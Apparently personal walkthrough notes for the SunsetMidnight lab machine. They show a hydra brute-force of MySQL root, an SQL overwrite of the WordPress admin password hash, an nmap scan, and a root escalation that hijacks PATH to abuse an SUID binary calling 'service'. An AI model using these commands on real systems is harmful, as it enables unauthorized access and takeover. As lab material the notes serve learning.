----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# SunsetMidnight
# 21/2/2023

----------------------------------------------------
# sql
----------------------------------------------------
hydra -l root -P /usr/share/wordlists/rockyou.txt sunset-midnight mysql -t 4
[3306][mysql] host: sunset-midnight   login: root   password: robert
We created a hash in md5 of the password “123456” (we will use it below).
└─$ echo -n "123456" | md5sum;echo ""
e10adc3949ba59abbe56e057f20f883e  -
└─$ mysql -h sunset-midnight -u root -probert
MariaDB [wordpress_db]> UPDATE wp_users SET user_pass="e10adc3949ba59abbe56e057f20f883e" WHERE ID=1;

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
3306/tcp open  mysql   MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1

----------------------------------------------------
# PrivEsc
----------------------------------------------------
find / -perm -u=s -type f 2>/dev/null 
/usr/bin/status
/usr/bin/status
● ssh.service - OpenBSD Secure Shell server
   Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
   Active: active (running) since Mon 2023-01-23 04:34:47 EST; 4 weeks 0 days ago
     Docs: man:sshd(8)
           man:sshd_config(5)
  Process: 472 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
 Main PID: 531 (sshd)
    Tasks: 1 (limit: 1148)
   Memory: 2.7M
   CGroup: /system.slice/ssh.service
           └─531 /usr/sbin/sshd -D

Jan 23 04:34:46 midnight systemd[1]: Starting OpenBSD Secure Shell server...
Jan 23 04:34:47 midnight sshd[531]: Server listening on 0.0.0.0 port 22.
Jan 23 04:34:47 midnight systemd[1]: Started OpenBSD Secure Shell server.


Running strings over the binary it appears that /usr/bin/status prints the information by running service ssh status.

->strings /usr/bin/status


$ export PATH=/tmp:$PATH
$ echo "/bin/sh -p" > /tmp/service
$ chmod +x /tmp/service
$ /usr/bin/status
id
